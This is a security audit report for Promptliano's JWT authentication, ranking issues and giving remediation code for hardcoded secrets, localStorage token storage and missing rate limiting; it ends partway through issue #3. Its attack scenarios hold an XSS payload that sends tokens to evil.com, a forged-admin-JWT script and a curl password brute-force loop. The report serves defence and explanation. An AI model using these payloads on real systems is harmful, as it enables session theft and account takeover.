# 🔒 Promptliano Authentication Security Fixes

**Generated:** 2025-10-04
**Audit Score:** 62/100
**Risk Level:** MEDIUM-HIGH
**Status:** ⚠️ REQUIRES ACTION BEFORE PRODUCTION

---

## 📊 Executive Summary

This document outlines security vulnerabilities discovered in Promptliano's JWT-based authentication system and provides complete implementation guides for all fixes.

### Overall Assessment

The authentication system demonstrates **solid architectural foundations** with:
- ✅ Proper password hashing (bcrypt 10 rounds)
- ✅ Token rotation on refresh
- ✅ Role-based access control
- ✅ Drizzle ORM preventing SQL injection

However, **critical vulnerabilities** exist that must be addressed:
- ❌ Hardcoded JWT secret default
- ❌ XSS-vulnerable token storage
- ❌ No rate limiting
- ❌ Missing CSRF protection

### Quick Reference Matrix

| # | Issue | Severity | Priority | Effort | Status |
|---|-------|----------|----------|--------|--------|
| 1 | JWT Secret Hardcoded | 🔴 CRITICAL (10/10) | P0 | 2h | ⏳ Pending |
| 2 | localStorage Token Storage | 🔴 CRITICAL (9/10) | P0 | 1d | ⏳ Pending |
| 3 | No Rate Limiting | 🟠 HIGH (8/10) | P0 | 4h | ⏳ Pending |
| 4 | Missing CSRF Protection | 🟠 HIGH (7/10) | P0 | 4h | ⏳ Pending |
| 5 | No Token Blacklist | 🟠 HIGH (6/10) | P1 | 6h | ⏳ Pending |
| 6 | Timing Attacks | 🟠 MEDIUM-HIGH (6/10) | P1 | 3h | ⏳ Pending |
| 7 | Client-side Token Expiry | 🟠 MEDIUM (5/10) | P1 | 2h | ⏳ Pending |
| 8 | Input Sanitization | 🟡 MEDIUM (5/10) | P2 | 4h | ⏳ Pending |
| 9 | Account Lockout | 🟡 MEDIUM (5/10) | P2 | 5h | ⏳ Pending |
| 10 | Sensitive Logging | 🟡 MEDIUM (4/10) | P2 | 2h | ⏳ Pending |
| 11 | Weak Passwords | 🟡 MEDIUM (4/10) | P2 | 3h | ⏳ Pending |
| 12 | Error Message Leaks | 🟢 LOW (3/10) | P2 | 2h | ⏳ Pending |
| 13 | Token Reuse Detection | 🟢 LOW (3/10) | P3 | 6h | ⏳ Pending |

### Implementation Timeline

```
Week 1 (Critical Fixes - 2-3 days):
├─ Fix JWT secret validation
├─ Migrate to httpOnly cookies OR memory storage
├─ Implement rate limiting
└─ Add CSRF protection

Week 2 (High Priority - 3-4 days):
├─ Add token blacklist
├─ Fix timing attacks
└─ Remove client-side token authority

Month 1 (Medium Priority - 1 week):
├─ Input sanitization
├─ Account lockout
├─ Password strength
└─ Audit logging
```

---

## 🔴 CRITICAL ISSUES (P0 - Fix Immediately)

### Issue #1: JWT Secret Defaults to Hardcoded String

**Severity:** 🔴 CRITICAL (10/10)
**CVSS Score:** 9.8 (Critical)
**Files Affected:**
- `/packages/services/src/auth-service.ts:26`

#### Vulnerability Description

The JWT signing secret defaults to a hardcoded string that is **publicly visible in source control**:

```typescript
const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-please-change-in-production'
```

**Why This is Critical:**
- Attackers can forge valid JWTs if they discover this default
- All tokens signed with this secret are compromised
- No validation that production uses a strong secret
- Every Promptliano instance using defaults shares the same secret

#### Attack Scenario

```typescript
// Attacker code (requires only knowledge of the default secret):
const jwt = require('jsonwebtoken')

const forgedToken = jwt.sign(
  {
    userId: 1,
    username: 'admin',
    role: 'admin',
    type: 'access'
  },
  'dev-secret-please-change-in-production' // Public default!
)

// Attacker now has admin access to ANY Promptliano instance using default secret
fetch('https://target-server.com/api/admin/users', {
  headers: {
    'Authorization': `Bearer ${forgedToken}`
  }
})
```

#### Complete Fix Implementation

**Step 1: Add Secret Validation**

File: `/packages/services/src/auth-service.ts`

```typescript
import crypto from 'crypto'

/**
 * Validate JWT secret meets security requirements
 */
function validateJwtSecret(secret: string): void {
  const MIN_SECRET_LENGTH = 32
  const FORBIDDEN_DEFAULTS = [
    'dev-secret-please-change-in-production',
    'secret',
    'password',
    'jwt-secret',
    'change-me'
  ]

  if (!secret) {
    throw new Error(
      'FATAL SECURITY ERROR: JWT_SECRET environment variable is required.\n' +
      'Generate a strong secret with: openssl rand -base64 64\n' +
      'Set in .env: JWT_SECRET=<generated-secret>'
    )
  }

  if (FORBIDDEN_DEFAULTS.some(forbidden => secret.toLowerCase().includes(forbidden))) {
    throw new Error(
      'FATAL SECURITY ERROR: JWT_SECRET uses a forbidden default value.\n' +
      'This secret is publicly known and MUST be changed.\n' +
      'Generate a strong secret with: openssl rand -base64 64'
    )
  }

  if (secret.length < MIN_SECRET_LENGTH) {
    throw new Error(
      `FATAL SECURITY ERROR: JWT_SECRET must be at least ${MIN_SECRET_LENGTH} characters.\n` +
      `Current length: ${secret.length}\n` +
      'Generate a strong secret with: openssl rand -base64 64'
    )
  }

  // Calculate entropy (basic check)
  const uniqueChars = new Set(secret.split('')).size
  if (uniqueChars < 16) {
    console.warn(
      '⚠️  WARNING: JWT_SECRET has low entropy (character diversity).\n' +
      'Consider generating a new secret with: openssl rand -base64 64'
    )
  }
}

/**
 * Initialize and validate JWT secret
 */
const JWT_SECRET = (() => {
  const secret = process.env.JWT_SECRET

  // In production, fail fast if secret is missing or weak
  if (process.env.NODE_ENV === 'production') {
    if (!secret) {
      throw new Error(
        'FATAL: JWT_SECRET environment variable MUST be set in production.\n' +
        'Server cannot start without a secure JWT secret.'
      )
    }
    validateJwtSecret(secret)
  }

  // In development/test, warn but allow (with secure default)
  if (!secret) {
    console.warn(
      '\n' +
      '═══════════════════════════════════════════════════════════\n' +
      '⚠️  SECURITY WARNING: Using auto-generated JWT secret\n' +
      '═══════════════════════════════════════════════════════════\n' +
      'For development, set JWT_SECRET in .env:\n' +
      '  openssl rand -base64 64 > .jwt-secret\n' +
      '  echo "JWT_SECRET=$(cat .jwt-secret)" >> .env\n' +
      '═══════════════════════════════════════════════════════════\n'
    )

    // Generate a random secret for this session only
    const sessionSecret = crypto.randomBytes(64).toString('base64')
    console.log('Using session secret (will change on restart):', sessionSecret.substring(0, 20) + '...')
    return sessionSecret
  }

  // Validate provided secret
  try {
    validateJwtSecret(secret)
    console.log('✅ JWT_SECRET validated successfully')
  } catch (error) {
    if (process.env.NODE_ENV === 'production') {
      throw error
    }
    console.error('⚠️  JWT_SECRET validation warning:', error.message)
  }

  return secret
})()

// Export for testing
export const getJwtSecret = () => JWT_SECRET
```

**Step 2: Update Environment Configuration**

File: `/packages/config/src/index.ts`

```typescript
// Add JWT configuration validation
export const config = {
  // ... existing config

  jwt: {
    secret: process.env.JWT_SECRET || (() => {
      if (process.env.NODE_ENV === 'production') {
        throw new Error('JWT_SECRET required in production')
      }
      return undefined
    })(),
    accessTokenExpiry: process.env.JWT_ACCESS_EXPIRY || '15m',
    refreshTokenExpiry: process.env.JWT_REFRESH_EXPIRY || '7d',
    algorithm: 'HS256' as const, // Explicitly set algorithm
  }
}

// Validate critical config on load
if (process.env.NODE_ENV === 'production' && !config.jwt.secret) {
  throw new Error('Configuration validation failed: JWT_SECRET is required in production')
}
```

**Step 3: Update .env.example**

File: `/.env.example`

```bash
# ============================================================================
# CRITICAL SECURITY: JWT Secret Configuration
# ============================================================================
# This secret is used to sign JWT tokens. It MUST be kept secret.
# Anyone with this secret can create valid authentication tokens.
#
# Generate a strong secret with:
#   openssl rand -base64 64
#
# NEVER commit the actual secret to version control!
# NEVER use the example values in production!
# ============================================================================

# JWT_SECRET= (⚠️ REQUIRED IN PRODUCTION - Generate with: openssl rand -base64 64)
JWT_ACCESS_EXPIRY=15m
JWT_REFRESH_EXPIRY=7d
```

**Step 4: Add Startup Security Check**

File: `/packages/server/src/app.ts`

```typescript
import { getJwtSecret } from '@promptliano/services'

// Perform security checks on server startup
async function performSecurityChecks() {
  console.log('\n🔒 Running security checks...\n')

  // Check 1: JWT Secret
  try {
    const secret = getJwtSecret()
    if (secret.length >= 32) {
      console.log('✅ JWT Secret: Validated')
    }
  } catch (error) {
    console.error('❌ JWT Secret: FAILED')
    throw error
  }

  // Check 2: Production environment checks
  if (process.env.NODE_ENV === 'production') {
    const checks = [
      { name: 'HTTPS Enabled', pass: process.env.FORCE_HTTPS === 'true' },
      { name: 'Debug Mode Disabled', pass: process.env.DEBUG !== 'true' },
      { name: 'Secure Cookies', pass: process.env.SECURE_COOKIES !== 'false' }
    ]

    for (const check of checks) {
      console.log(`${check.pass ? '✅' : '⚠️ '} ${check.name}`)
    }
  }

  console.log('\n✅ Security checks complete\n')
}

// Call during server initialization
await performSecurityChecks()
```

#### Verification Testing

```bash
# Test 1: Verify rejection of weak secrets
JWT_SECRET="weak" bun run dev
# Expected: Error thrown with message about minimum length

# Test 2: Verify rejection of default secret
JWT_SECRET="dev-secret-please-change-in-production" bun run dev
# Expected: Error thrown about forbidden default

# Test 3: Verify acceptance of strong secret
JWT_SECRET=$(openssl rand -base64 64) bun run dev
# Expected: Server starts successfully

# Test 4: Production validation
NODE_ENV=production bun run dev
# Expected: Error if JWT_SECRET not set
```

#### Deployment Checklist

- [ ] Generate production secret: `openssl rand -base64 64`
- [ ] Store in secure secrets manager (AWS Secrets Manager, Vault, etc.)
- [ ] Set `JWT_SECRET` environment variable on production servers
- [ ] Verify secret is at least 64 characters
- [ ] Confirm secret is NOT in version control
- [ ] Document secret rotation procedure
- [ ] Set up monitoring for JWT validation failures

---

### Issue #2: Tokens Stored in localStorage (XSS Vulnerability)

**Severity:** 🔴 CRITICAL (9/10)
**CVSS Score:** 8.8 (High)
**Files Affected:**
- `/packages/client/src/contexts/auth-context.tsx:91-93`
- `/packages/client/src/lib/router/auth.ts:29-32`

#### Vulnerability Description

JWT tokens are stored in browser `localStorage`, which is accessible to **all JavaScript** running on the page. Any XSS vulnerability instantly compromises all user sessions.

```typescript
// Current implementation - VULNERABLE:
localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, data.accessToken)
localStorage.setItem(STORAGE_KEYS.REFRESH_TOKEN, data.refreshToken)
```

**Why This is Critical:**
- localStorage is accessible to all JavaScript (including malicious scripts)
- Any XSS vulnerability = complete token theft
- Tokens persist across browser restarts
- No protection against compromised third-party scripts

#### Attack Scenario

```html
<!-- Attacker injects malicious script via XSS: -->
<img src=x onerror="
  // Steal all auth tokens
  const tokens = {
    access: localStorage.getItem('promptliano_access_token'),
    refresh: localStorage.getItem('promptliano_refresh_token'),
    user: localStorage.getItem('promptliano_user')
  };

  // Send to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(tokens)
  });

  // Attacker now has full account access
">
```

#### Solution Options

**Option A: HttpOnly Cookies (Recommended)**
**Option B: Memory + SessionStorage Hybrid**

We'll implement **Option A** as it provides the strongest protection.

---

#### Complete Fix Implementation - Option A: HttpOnly Cookies

**Step 1: Update Server - Cookie Management**

File: `/packages/server/src/routes/auth-routes.ts`

```typescript
import { setCookie, getCookie, deleteCookie } from 'hono/cookie'
import { successResponse, ErrorFactory } from '@promptliano/shared'

// Cookie configuration
const COOKIE_OPTIONS = {
  httpOnly: true,    // ✅ JavaScript cannot access
  secure: process.env.NODE_ENV === 'production', // ✅ HTTPS only in production
  sameSite: 'Strict' as const, // ✅ CSRF protection
  path: '/',
  domain: undefined, // Use default (current domain)
} as const

const ACCESS_COOKIE_OPTIONS = {
  ...COOKIE_OPTIONS,
  maxAge: 15 * 60, // 15 minutes
}

const REFRESH_COOKIE_OPTIONS = {
  ...COOKIE_OPTIONS,
  maxAge: 7 * 24 * 60 * 60, // 7 days
}

// Update login handler
authRoutes.openapi(loginRoute, async (c) => {
  const { username, password } = c.req.valid('json')

  try {
    const result = await authService.authenticateUser(username, password)

    // Set tokens as httpOnly cookies (JavaScript cannot access)
    setCookie(c, 'access_token', result.accessToken, ACCESS_COOKIE_OPTIONS)
    setCookie(c, 'refresh_token', result.refreshToken, REFRESH_COOKIE_OPTIONS)

    // Return ONLY user data (no tokens in response body)
    return c.json(successResponse({
      user: result.user,
      message: 'Login successful'
    }), 200)
  } catch (error) {
    throw ErrorFactory.unauthorized('Invalid credentials')
  }
})

// Update refresh handler
authRoutes.openapi(refreshRoute, async (c) => {
  // Get refresh token from httpOnly cookie
  const refreshToken = getCookie(c, 'refresh_token')

  if (!refreshToken) {
    throw ErrorFactory.unauthorized('No refresh token provided')
  }

  try {
    const result = await authService.refreshAccessToken(refreshToken)

    // Set new tokens as httpOnly cookies
    setCookie(c, 'access_token', result.accessToken, ACCESS_COOKIE_OPTIONS)
    setCookie(c, 'refresh_token', result.refreshToken, REFRESH_COOKIE_OPTIONS)

    return c.json(successResponse({
      user: result.user,
      message: 'Token refreshed successfully'
    }), 200)
  } catch (error) {
    // Clear invalid cookies
    deleteCookie(c, 'access_token')
    deleteCookie(c, 'refresh_token')
    throw ErrorFactory.unauthorized('Invalid refresh token')
  }
})

// Update logout handler
authRoutes.openapi(logoutRoute, async (c) => {
  const refreshToken = getCookie(c, 'refresh_token')

  if (refreshToken) {
    try {
      await authService.logout(refreshToken)
    } catch (error) {
      // Log error but still clear cookies
      console.error('Error during logout:', error)
    }
  }

  // Clear auth cookies
  deleteCookie(c, 'access_token')
  deleteCookie(c, 'refresh_token')

  return c.json(successResponse({ message: 'Logged out successfully' }), 200)
})

// Update setup handler
authRoutes.openapi(setupRoute, async (c) => {
  const { username, password, email } = c.req.valid('json')

  try {
    const result = await authService.setupFirstUser(username, password, email)

    // Set tokens as httpOnly cookies
    setCookie(c, 'access_token', result.accessToken, ACCESS_COOKIE_OPTIONS)
    setCookie(c, 'refresh_token', result.refreshToken, REFRESH_COOKIE_OPTIONS)

    return c.json(successResponse({
      user: result.user,
      message: 'Setup completed successfully'
    }), 200)
  } catch (error) {
    throw ErrorFactory.internal('Setup failed')
  }
})
```

**Step 2: Update Auth Interceptor - Read from Cookies**

File: `/packages/server/src/interceptors/request/auth-interceptor.ts`

```typescript
import { getCookie } from 'hono/cookie'

export const authInterceptor = createMiddleware(async (c, next) => {
  const path = c.req.path

  // Check if route is public
  if (isPublicRoute(path)) {
    return next()
  }

  // Extract token from httpOnly cookie (not from headers!)
  const token = getCookie(c, 'access_token')

  if (!token) {
    throw ErrorFactory.unauthorized('Authentication required')
  }

  // Validate token
  try {
    const user = await validateToken(token)

    // Set user in context
    c.set('user', user)
    c.set('userId', user.id)
    c.set('userRole', user.role)

    return next()
  } catch (error) {
    throw ErrorFactory.unauthorized('Invalid or expired token')
  }
})
```

**Step 3: Update Client - Remove localStorage Usage**

File: `/packages/client/src/contexts/auth-context.tsx`

```typescript
import { createContext, useContext, useState, useCallback, useEffect, ReactNode } from 'react'
import { useNavigate } from '@tanstack/react-router'
import { createAuthClient, type User } from '@promptliano/api-client'

const STORAGE_KEYS = {
  USER: 'promptliano_user', // Only user data (non-sensitive) in localStorage
} as const

interface AuthContextType {
  user: User | null
  isAuthenticated: boolean
  isLoading: boolean
  login: (username: string, password?: string) => Promise<void>
  logout: () => Promise<void>
  setupFirstUser: (username: string, password?: string, email?: string) => Promise<void>
  refreshAuth: () => Promise<void>
}

const AuthContext = createContext<AuthContextType | undefined>(undefined)

export function AuthProvider({ children, serverUrl }: { children: ReactNode; serverUrl: string }) {
  const [user, setUser] = useState<User | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const navigate = useNavigate()

  const authClient = createAuthClient(serverUrl)

  // Load user data from localStorage (but NOT tokens - they're in httpOnly cookies)
  useEffect(() => {
    const loadUser = async () => {
      try {
        const storedUser = localStorage.getItem(STORAGE_KEYS.USER)
        if (storedUser) {
          const userData = JSON.parse(storedUser)

          // Verify session is still valid by fetching current user
          // This will use the httpOnly cookie automatically
          const response = await authClient.getCurrentUser()

          if (response.user) {
            setUser(response.user)
            // Update stored user data if changed
            localStorage.setItem(STORAGE_KEYS.USER, JSON.stringify(response.user))
          }
        }
      } catch (error) {
        // Session invalid - clear user data
        localStorage.removeItem(STORAGE_KEYS.USER)
        setUser(null)
      } finally {
        setIsLoading(false)
      }
    }

    loadUser()
  }, [])

  // Auto-refresh token periodically
  useEffect(() => {
    if (!user) return

    // Check every 5 minutes if we should refresh
    // The server will handle refresh using httpOnly cookies
    const interval = setInterval(async () => {
      try {
        await authClient.refreshToken({})
        console.log('Token refreshed successfully')
      } catch (error) {
        console.error('Token refresh failed:', error)
        // Session expired - logout
        await logout()
      }
    }, 5 * 60 * 1000) // Every 5 minutes

    return () => clearInterval(interval)
  }, [user])

  const login = useCallback(async (username: string, password?: string) => {
    setIsLoading(true)
    try {
      const response = await authClient.login({ username, password })

      // Server sets httpOnly cookies automatically
      // We only store non-sensitive user data
      setUser(response.user)
      localStorage.setItem(STORAGE_KEYS.USER, JSON.stringify(response.user))

      navigate({ to: '/projects' })
    } catch (error) {
      console.error('Login failed:', error)
      throw error
    } finally {
      setIsLoading(false)
    }
  }, [navigate])

  const logout = useCallback(async () => {
    try {
      // Server will clear httpOnly cookies
      await authClient.logout({})
    } catch (error) {
      console.error('Logout error:', error)
    } finally {
      // Clear local user data
      setUser(null)
      localStorage.removeItem(STORAGE_KEYS.USER)
      navigate({ to: '/login' })
    }
  }, [navigate])

  const setupFirstUser = useCallback(async (
    username: string,
    password?: string,
    email?: string
  ) => {
    setIsLoading(true)
    try {
      const response = await authClient.setup({ username, password, email })

      // Server sets httpOnly cookies
      setUser(response.user)
      localStorage.setItem(STORAGE_KEYS.USER, JSON.stringify(response.user))

      navigate({ to: '/projects' })
    } catch (error) {
      console.error('Setup failed:', error)
      throw error
    } finally {
      setIsLoading(false)
    }
  }, [navigate])

  const refreshAuth = useCallback(async () => {
    try {
      // Server handles refresh using httpOnly cookies
      await authClient.refreshToken({})
    } catch (error) {
      await logout()
    }
  }, [logout])

  return (
    <AuthContext.Provider
      value={{
        user,
        isAuthenticated: !!user,
        isLoading,
        login,
        logout,
        setupFirstUser,
        refreshAuth
      }}
    >
      {children}
    </AuthContext.Provider>
  )
}

export const useAuth = () => {
  const context = useContext(AuthContext)
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider')
  }
  return context
}
```

**Step 4: Update API Client - Use Cookies Instead of Headers**

File: `/packages/api-client/src/auth-client.ts`

```typescript
export class AuthClient extends BaseApiClient {
  // Remove all accessToken parameters - cookies handled automatically

  async getCurrentUser(): Promise<{ user: User }> {
    // No token needed - httpOnly cookie sent automatically
    return this.request<{ user: User }>('GET', '/api/auth/me')
  }

  async listUsers(): Promise<{ users: User[] }> {
    // No token needed - httpOnly cookie sent automatically
    return this.request<{ users: User[] }>('GET', '/api/admin/users')
  }

  async createUser(data: CreateUserRequest): Promise<{ user: User }> {
    return this.request<{ user: User }>('POST', '/api/admin/users', { body: data })
  }

  async updateUser(id: number, data: UpdateUserRequest): Promise<{ user: User }> {
    return this.request<{ user: User }>('PUT', `/api/admin/users/${id}`, { body: data })
  }

  async deleteUser(id: number): Promise<{ success: boolean }> {
    return this.request<{ success: boolean }>('DELETE', `/api/admin/users/${id}`)
  }

  async refreshToken(data: {}): Promise<AuthResponse> {
    // Refresh token in httpOnly cookie sent automatically
    return this.request<AuthResponse>('POST', '/api/auth/refresh')
  }

  async logout(data: {}): Promise<{ success: boolean }> {
    // Refresh token in httpOnly cookie sent automatically
    return this.request<{ success: boolean }>('POST', '/api/auth/logout')
  }
}
```

**Step 5: Update Router Guards**

File: `/packages/client/src/lib/router/auth.ts`

```typescript
import { redirect } from '@tanstack/react-router'
import type { ParsedLocation } from '@tanstack/react-router'
import type { User } from '@promptliano/api-client'

export interface AuthState {
  isAuthenticated: boolean
  user: User | null
}

// Simple check - user data in localStorage means we have a session
export function getAuthState(): AuthState {
  try {
    const userStr = localStorage.getItem('promptliano_user')

    if (!userStr) {
      return { isAuthenticated: false, user: null }
    }

    const user = JSON.parse(userStr) as User
    return { isAuthenticated: true, user }
  } catch (error) {
    return { isAuthenticated: false, user: null }
  }
}

export async function requireAuth({ location }: { location: ParsedLocation }) {
  const auth = getAuthState()

  if (!auth.isAuthenticated) {
    throw redirect({
      to: '/login',
      search: { redirect: location.href }
    })
  }

  return { auth }
}

export async function requireAdmin({ location }: { location: ParsedLocation }) {
  const auth = getAuthState()

  if (!auth.isAuthenticated) {
    throw redirect({
      to: '/login',
      search: { redirect: location.href }
    })
  }

  if (auth.user?.role !== 'admin') {
    throw redirect({ to: '/projects' })
  }

  return { auth: { ...auth, isAdmin: true } }
}
```

**Step 6: Update Base API Client - Enable Credentials**

File: `/packages/api-client/src/base-client.ts`

```typescript
protected async request<TResponse>(
  method: string,
  endpoint: string,
  options?: RequestOptions
): Promise<TResponse> {
  // ... existing code ...

  const response = await this.customFetch(url.toString(), {
    method,
    headers,
    body,
    signal: controller.signal,
    credentials: 'include', // ✅ Include cookies in requests
  })

  // ... rest of implementation
}
```

**Step 7: Configure CORS for Cookies**

File: `/packages/server/src/app.ts`

```typescript
import { cors } from 'hono/cors'

app.use('*', cors({
  origin: process.env.CLIENT_URL || 'http://localhost:5173',
  credentials: true, // ✅ Allow cookies in CORS requests
  allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowHeaders: ['Content-Type', 'Authorization'],
  exposeHeaders: ['Content-Length', 'X-Request-Id'],
  maxAge: 600, // Cache preflight for 10 minutes
}))
```

#### Verification Testing

```bash
# Test 1: Verify tokens NOT in localStorage
# Open browser DevTools → Application → Local Storage
# Should see ONLY: promptliano_user (no tokens)

# Test 2: Verify httpOnly cookies set
# DevTools → Application → Cookies
# Should see: access_token, refresh_token with HttpOnly flag ✅

# Test 3: Verify JavaScript cannot access tokens
# In browser console:
document.cookie
# Should NOT show access_token or refresh_token

# Test 4: Verify automatic cookie sending
# DevTools → Network → Select any authenticated request
# Request Headers should include: Cookie: access_token=...; refresh_token=...

# Test 5: Verify XSS protection
localStorage.getItem('promptliano_access_token')
# Should return: null ✅
```

#### Migration Path for Existing Users

File: `/packages/client/src/contexts/auth-context.tsx` (add migration logic)

```typescript
// Run once on app load to migrate from localStorage to cookies
useEffect(() => {
  const migrateFromLocalStorage = async () => {
    // Check if old tokens exist in localStorage
    const oldAccessToken = localStorage.getItem('promptliano_access_token')
    const oldRefreshToken = localStorage.getItem('promptliano_refresh_token')

    if (oldRefreshToken) {
      try {
        // Use old refresh token to get new cookies
        await authClient.refreshToken({ refreshToken: oldRefreshToken })

        // Clear old localStorage tokens
        localStorage.removeItem('promptliano_access_token')
        localStorage.removeItem('promptliano_refresh_token')

        console.log('✅ Migrated to httpOnly cookies')
      } catch (error) {
        console.error('Migration failed:', error)
        // Clear invalid tokens
        localStorage.removeItem('promptliano_access_token')
        localStorage.removeItem('promptliano_refresh_token')
        localStorage.removeItem('promptliano_user')
      }
    }
  }

  migrateFromLocalStorage()
}, [])
```

---

### Issue #3: No Rate Limiting on Authentication Endpoints

**Severity:** 🟠 HIGH (8/10)
**CVSS Score:** 7.5 (High)
**Files Affected:**
- All routes in `/packages/server/src/routes/auth-routes.ts`
- All routes in `/packages/server/src/routes/admin-routes.ts`

#### Vulnerability Description

Authentication endpoints have **no rate limiting**, allowing unlimited login attempts and automated attacks.

**Attack Vectors:**
- **Brute force attacks**: Try thousands of passwords per second
- **Credential stuffing**: Test leaked credentials at high speed
- **DDoS**: Overwhelm server with auth requests
- **User enumeration**: Probe for valid usernames

#### Attack Scenario

```bash
# Brute force attack - try common passwords at high speed
for password in $(cat rockyou.txt); do
  curl -X POST http://target/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$password\"}"
done

# Can test 1000s of passwords in minutes without any restrictions
```

#### Complete Fix Implementation

**Step 1: Create Rate Limiting Middleware**

File: `/packages/server/src/middleware/rate-limiter.ts`

```typescript
import { createMiddleware } from 'hono/factory'
import { ErrorFactory } from '@promptliano/shared'
import type { Context } from 'hono'

interface RateLimitConfig {
  windowMs: number           // Time window in milliseconds
  maxRequests: number        // Max requests allowed in window
  keyGenerator?: (c: Context) => string  // Custom key function
  skipSuccessfulRequests?: boolean       // Don't count successful requests
  message?: string           // Custom error message
  onLimitReached?: (key: string, c: Context) => void  // Callback
}

interface RateLimitRecord {
  count: number
  resetAt: number
  blocked: boolean
}

// In-memory store (use Redis in production)
const requestCounts = new Map<string, RateLimitRecord>()

/**
 * Create a rate limiting middleware
 */
export function createRateLimiter(config: RateLimitConfig) {
  return createMiddleware(async (c, next) => {
    const key = config.keyGenerator?.(c) || getDefaultKey(c)
    const now = Date.now()

    let record = requestCounts.get(key)

    // Create or reset record if window expired
    if (!record || now > record.resetAt) {
      record = {
        count: 0,
        resetAt: now + config.windowMs,
        blocked: false
      }
      requestCounts.set(key, record)
    }

    // Check if blocked
    if (record.blocked && now < record.resetAt) {
      const retryAfter = Math.ceil((record.resetAt - now) / 1000)
      c.header('Retry-After', retryAfter.toString())
      c.header('X-RateLimit-Limit', config.maxRequests.toString())
      c.header('X-RateLimit-Remaining', '0')
      c.header('X-RateLimit-Reset', record.resetAt.toString())

      throw ErrorFactory.tooManyRequests(
        config.message || `Too many requests. Please try again in ${retryAfter} seconds.`
      )
    }

    // Increment count
    record.count++

    // Set rate limit headers
    c.header('X-RateLimit-Limit', config.maxRequests.toString())
    c.header('X-RateLimit-Remaining', Math.max(0, config.maxRequests - record.count).toString())
    c.header('X-RateLimit-Reset', record.resetAt.toString())

    // Check if limit exceeded
    if (record.count > config.maxRequests) {
      record.blocked = true

      if (config.onLimitReached) {
        config.onLimitReached(key, c)
      }

      const retryAfter = Math.ceil((record.resetAt - now) / 1000)
      c.header('Retry-After', retryAfter.toString())

      throw ErrorFactory.tooManyRequests(
        config.message || `Rate limit exceeded. Try again in ${retryAfter} seconds.`
      )
    }

    await next()

    // Decrement count for successful requests if configured
    if (config.skipSuccessfulRequests && c.res.status < 400) {
      record.count = Math.max(0, record.count - 1)
    }
  })
}

/**
 * Default key generator - uses IP address
 */
function getDefaultKey(c: Context): string {
  const ip = c.req.header('x-forwarded-for')?.split(',')[0].trim() ||
             c.req.header('x-real-ip') ||
             'unknown'
  return `ratelimit:${ip}`
}

/**
 * Cleanup expired entries periodically
 */
setInterval(() => {
  const now = Date.now()
  for (const [key, record] of requestCounts.entries()) {
    if (now > record.resetAt) {
      requestCounts.delete(key)
    }
  }
}, 60000) // Clean up every minute

/**
 * Predefined rate limiters for common use cases
 */
export const rateLimiters = {
  // Strict rate limit for login attempts
  login: createRateLimiter({
    windowMs: 15 * 60 * 1000, // 15 minutes
    maxRequests: 5,
    keyGenerator: (c) => {
      // Rate limit by username + IP
      const ip = c.req.header('x-forwarded-for')?.split(',')[0] || 'unknown'
      const body = c.req.raw.body as any // Will be parsed by validator
      return `login:${body?.username || 'unknown'}:${ip}`
    },
    message: 'Too many login attempts. Please try again in 15 minutes.',
    onLimitReached: (key, c) => {
      console.warn(`🚨 Rate limit exceeded for login: ${key}`)
    }
  }),

  // Moderate rate limit for token refresh
  refresh: createRateLimiter({
    windowMs: 15 * 60 * 1000, // 15 minutes
    maxRequests: 20,
    message: 'Too many token refresh requests.',
  }),

  // Very strict for first-time setup
  setup: createRateLimiter({
    windowMs: 60 * 60 * 1000, // 1 hour
    maxRequests: 3,
    message: 'Setup endpoint is rate limited. Please try again later.',
  }),

  // Moderate for admin operations
  admin: createRateLimiter({
    windowMs: 15 * 60 * 1000, // 15 minutes
    maxRequests: 100,
    message: 'Too many admin requests.',
  }),

  // General API rate limit
  api: createRateLimiter({
    windowMs: 15 * 60 * 1000, // 15 minutes
    maxRequests: 1000,
  }),
}
```

**Step 2: Apply Rate Limiters to Auth Routes**

File: `/packages/server/src/routes/auth-routes.ts`

```typescript
import { rateLimiters } from '../middleware/rate-limiter'

// Apply strict rate limiting to login
authRoutes.openapi(
  loginRoute,
  rateLimiters.login, // ✅ Max 5 attempts per 15 minutes
  async (c) => {
    const { username, password } = c.req.valid('json')

    try {
      const result = await authService.authenticateUser(username, password)

      setCookie(c, 'access_token', result.accessToken, ACCESS_COOKIE_OPTIONS)
      setCookie(c, 'refresh_token', result.refreshToken, REFRESH_COOKIE_OPTIONS)

      return c.json(successResponse({ user: result.user }), 200)
    } catch (error) {
      throw ErrorFactory.unauthorized('Invalid credentials')
    }
  }
)

// Apply moderate rate limiting to token refresh
authRoutes.openapi(
  refreshRoute,
  rateLimiters.refresh, // ✅ Max 20 refreshes per 15 minutes
  async (c) => {
    const refreshToken = getCookie(c, 'refresh_token')

    if (!refreshToken) {
      throw ErrorFactory.unauthorized('No refresh token')
    }

    const result = await authService.refreshAccessToken(refreshToken)

    setCookie(c, 'access_token', result.accessToken, ACCESS_COOKIE_OPTIONS)
    setCookie(c, 'refresh_token', result.refreshToken, REFRESH_COOKIE_OPTIONS)

    return c.json(successResponse({ user: result.user }), 200)
  }
)

// Apply very strict rate limiting to setup
authRoutes.openapi(
  setupRoute,
  rateLimiters.setup, // ✅ Max 3 attempts per hour
  async (c) => {
    const { username, password, email } = c.req.valid('json')

    const result = await authService.setupFirstUser(username, password, email)

    setCookie(c, 'access_token', result.accessToken, ACCESS_COOKIE_OPTIONS)
    setCookie(c, 'refresh_token', result.refreshToken, REFRESH_COOKIE_OPTIONS)

    return c.json(successResponse({ user: result.user }), 200)
  }
)

// No rate limit on status check (public endpoint)
authRoutes.openapi(statusRoute, async (c) => {
  // ... existing implementation
})

// Moderate rate limit on logout
authRoutes.openapi(
  logoutRoute,
  rateLimiters.api,
  async (c) => {
    // ... existing implementation
  }
)
```

**Step 3: Apply Rate Limiters to Admin Routes**

File: `/packages/server/src/routes/admin-routes.ts`

```typescript
import { rateLimiters } from '../middleware/rate-limiter'

// Apply to all admin routes
adminRoutes.use('*', rateLimiters.admin) // ✅ Max 100 requests per 15 minutes

adminRoutes.openapi(listUsersRoute, async (c) => {
  // ... existing implementation
})

adminRoutes.openapi(createUserRoute, async (c) => {
  // ... existing implementation
})

// ... other admin routes
```

**Step 4: Add Global API Rate Limit**

